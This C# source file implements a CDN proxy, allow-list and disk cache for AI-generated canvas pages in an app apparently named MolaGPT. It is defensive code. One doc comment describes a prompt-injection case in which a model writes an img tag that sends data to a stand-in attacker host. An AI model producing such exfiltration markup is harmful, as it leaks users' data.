using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;

namespace MolaGPT.App.Rendering.Canvas;

internal sealed record CdnResponse(byte[] Body, string ContentType);

/// <summary>
/// Fetches what canvas pages load from CDNs, on the page's behalf.
///
/// Three reasons it goes through us rather than straight from the browser:
///  - Reach. jsDelivr and unpkg are slow-to-unusable from mainland China
///    (measured: a 1 MB echarts build did not finish in 12 s from jsDelivr,
///    0.5 s from npmmirror). Each request races the original against mirrors
///    that serve the same package paths, and the first complete body wins —
///    so users elsewhere lose nothing and users in China get the mirror.
///  - Memory. Every successful body is kept on disk, so a page generated last
///    week still renders offline.
///  - One gate. The allow-list lives here and in the CSP, nowhere else.
///
/// Mirrors are chosen for being run by large, accountable operators. BootCDN
/// and Staticfile are deliberately absent: they were named in the 2024
/// polyfill.io supply-chain incident.
/// </summary>
internal static class CdnProxy
{
    /// <summary>Hosts a canvas page may load from. Anything else is refused,
    /// images included — a model tricked by injected text into writing
    /// <c>&lt;img src="https://attacker/?q=…"&gt;</c> must not get to send it.</summary>
    public static readonly string[] AllowedHosts =
    [
        "cdn.jsdelivr.net", "fastly.jsdelivr.net", "gcore.jsdelivr.net",
        "unpkg.com", "cdnjs.cloudflare.com", "esm.sh", "cdn.tailwindcss.com",
        "registry.npmmirror.com", "cdn.npmmirror.com", "lib.baomitu.com",
        "fonts.googleapis.com", "fonts.gstatic.com",
    ];

    private const long MaxBody = 24 * 1024 * 1024;
    private const long CacheBudget = 256L * 1024 * 1024;

    private static readonly HttpClient Http = CreateClient();
    private static int _trimmed;

    public static string CacheDirectory { get; } = Path.Combine(CanvasEnvironment.Root, "cdn-cache");

    public static bool IsAllowed(string host) =>
        AllowedHosts.Contains(host.ToLowerInvariant(), StringComparer.Ordinal);

    public static async Task<CdnResponse?> FetchAsync(Uri uri, CancellationToken ct)
    {
        var key = Hash(uri.AbsoluteUri);
        if (ReadCache(key) is { } cached) return cached;

        var candidates = Candidates(uri).ToList();
        using var race = CancellationTokenSource.CreateLinkedTokenSource(ct);
        race.CancelAfter(TimeSpan.FromSeconds(40));
        var pending = candidates.Select(candidate => FetchOneAsync(candidate, race.Token)).ToList();

        while (pending.Count > 0)
        {
            var finished = await Task.WhenAny(pending).ConfigureAwait(false);
            pending.Remove(finished);
            if (await finished.ConfigureAwait(false) is not { } response) continue;

            await race.CancelAsync().ConfigureAwait(false);
            WriteCache(key, response);
            return response;
        }

        return null;
    }

    /// <summary>The original first, then mirrors that serve the same file under
    /// a different path scheme. Only unambiguous mappings: a bare package URL
    /// (no file path) resolves to different entry files on different CDNs, so
    /// it is not mirrored.</summary>
    private static IEnumerable<Uri> Candidates(Uri uri)
    {
        yield return uri;

        var host = uri.Host.ToLowerInvariant();
        var path = uri.AbsolutePath;

        if (host is "cdn.jsdelivr.net" or "fastly.jsdelivr.net" or "gcore.jsdelivr.net"
            && path.StartsWith("/npm/", StringComparison.Ordinal)
            && SplitPackage(path["/npm/".Length..]) is { } npm)
        {
            yield return new Uri($"https://registry.npmmirror.com/{npm.Name}/{npm.Version}/files/{npm.File}{uri.Query}");
            yield return new Uri($"https://unpkg.com/{npm.Name}@{npm.Version}/{npm.File}{uri.Query}");
        }
        else if (host is "cdn.jsdelivr.net" or "fastly.jsdelivr.net" or "gcore.jsdelivr.net"
                 && path.StartsWith("/npm/", StringComparison.Ordinal)
                 && !path.Contains('+'))
        {
            // Bare package URL: unpkg picks the browser build the same way
            // jsDelivr does for nearly every library a page would load.
            yield return new Uri("https://unpkg.com/" + path["/npm/".Length..] + uri.Query);
        }
        else if (host == "unpkg.com" && SplitPackage(path.TrimStart('/')) is { } pkg)
        {
            yield return new Uri($"https://registry.npmmirror.com/{pkg.Name}/{pkg.Version}/files/{pkg.File}");
            yield return new Uri($"https://cdn.jsdelivr.net/npm/{pkg.Name}@{pkg.Version}/{pkg.File}");
        }
        else if (host == "cdnjs.cloudflare.com" && path.StartsWith("/ajax/libs/", StringComparison.Ordinal))
        {
            yield return new Uri("https://lib.baomitu.com/" + path["/ajax/libs/".Length..] + uri.Query);
        }
    }

    /// <summary>"echarts@5.5.1/dist/echarts.min.js" or "@antv/g2@5/dist/g2.min.js"
    /// → (name, version, file). Null when there is no file part or the path
    /// uses a jsDelivr-only feature (+esm, directory listings).</summary>
    private static (string Name, string Version, string File)? SplitPackage(string spec)
    {
        var segments = spec.Split('/');
        var nameSegments = spec.StartsWith('@') ? 2 : 1;
        if (segments.Length <= nameSegments) return null;

        var head = string.Join('/', segments.Take(nameSegments));
        var file = string.Join('/', segments.Skip(nameSegments));
        if (file.Length == 0 || file.Contains('+') || file.EndsWith('/')) return null;

        var at = head.LastIndexOf('@');
        var (name, version) = at > 0 ? (head[..at], head[(at + 1)..]) : (head, "latest");
        if (version.Length == 0) version = "latest";
        return (name, version, file);
    }

    private static async Task<CdnResponse?> FetchOneAsync(Uri uri, CancellationToken ct)
    {
        try
        {
            using var request = new HttpRequestMessage(HttpMethod.Get, uri);
            using var response = await Http.SendAsync(request, HttpCompletionOption.ResponseHeadersRead, ct).ConfigureAwait(false);
            if (response.StatusCode != HttpStatusCode.OK) return null;
            if (response.Content.Headers.ContentLength is > MaxBody) return null;
            var body = await response.Content.ReadAsByteArrayAsync(ct).ConfigureAwait(false);
            if (body.Length > MaxBody) return null;
            var type = response.Content.Headers.ContentType?.ToString();
            return new CdnResponse(body, string.IsNullOrWhiteSpace(type) ? GuessType(uri.AbsolutePath) : type!);
        }
        catch (Exception ex) when (ex is HttpRequestException or TaskCanceledException or OperationCanceledException or IOException)
        {
            return null;
        }
    }

    private static string GuessType(string path) => Path.GetExtension(path).ToLowerInvariant() switch
    {
        ".js" or ".mjs" or ".cjs" => "application/javascript; charset=utf-8",
        ".css" => "text/css; charset=utf-8",
        ".json" => "application/json; charset=utf-8",
        ".wasm" => "application/wasm",
        ".svg" => "image/svg+xml",
        ".woff2" => "font/woff2",
        ".woff" => "font/woff",
        ".ttf" => "font/ttf",
        ".png" => "image/png",
        _ => "application/octet-stream",
    };

    // ---- disk cache --------------------------------------------------------------

    private static CdnResponse? ReadCache(string key)
    {
        try
        {
            var body = Path.Combine(CacheDirectory, key + ".bin");
            var type = Path.Combine(CacheDirectory, key + ".type");
            if (!File.Exists(body) || !File.Exists(type)) return null;
            File.SetLastAccessTimeUtc(body, DateTime.UtcNow);
            return new CdnResponse(File.ReadAllBytes(body), File.ReadAllText(type));
        }
        catch (IOException)
        {
            return null;
        }
        catch (UnauthorizedAccessException)
        {
            return null;
        }
    }

    private static void WriteCache(string key, CdnResponse response)
    {
        try
        {
            Directory.CreateDirectory(CacheDirectory);
            var body = Path.Combine(CacheDirectory, key + ".bin");
            var temp = body + ".tmp";
            File.WriteAllBytes(temp, response.Body);
            File.Move(temp, body, overwrite: true);
            File.WriteAllText(Path.Combine(CacheDirectory, key + ".type"), response.ContentType);
            if (Interlocked.Exchange(ref _trimmed, 1) == 0) _ = Task.Run(Trim);
        }
        catch (IOException)
        {
        }
        catch (UnauthorizedAccessException)
        {
        }
    }

    /// <summary>Once per run: drop least-recently-used entries past the budget.</summary>
    private static void Trim()
    {
        try
        {
            var files = new DirectoryInfo(CacheDirectory).GetFiles("*.bin")
                .OrderByDescending(f => f.LastAccessTimeUtc)
                .ToList();
            long total = 0;
            foreach (var file in files)
            {
                total += file.Length;
                if (total <= CacheBudget) continue;
                file.Delete();
                File.Delete(Path.ChangeExtension(file.FullName, ".type"));
            }
        }
        catch (IOException)
        {
        }
        catch (UnauthorizedAccessException)
        {
        }
    }

    private static string Hash(string value) =>
        Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(value)))[..32].ToLowerInvariant();

    private static HttpClient CreateClient()
    {
        var handler = new SocketsHttpHandler
        {
            AutomaticDecompression = DecompressionMethods.All,
            AllowAutoRedirect = true,
            ConnectTimeout = TimeSpan.FromSeconds(8),
            PooledConnectionLifetime = TimeSpan.FromMinutes(5),
        };
        var client = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(40) };
        client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) MolaGPT-Canvas/1.0");
        return client;
    }
}
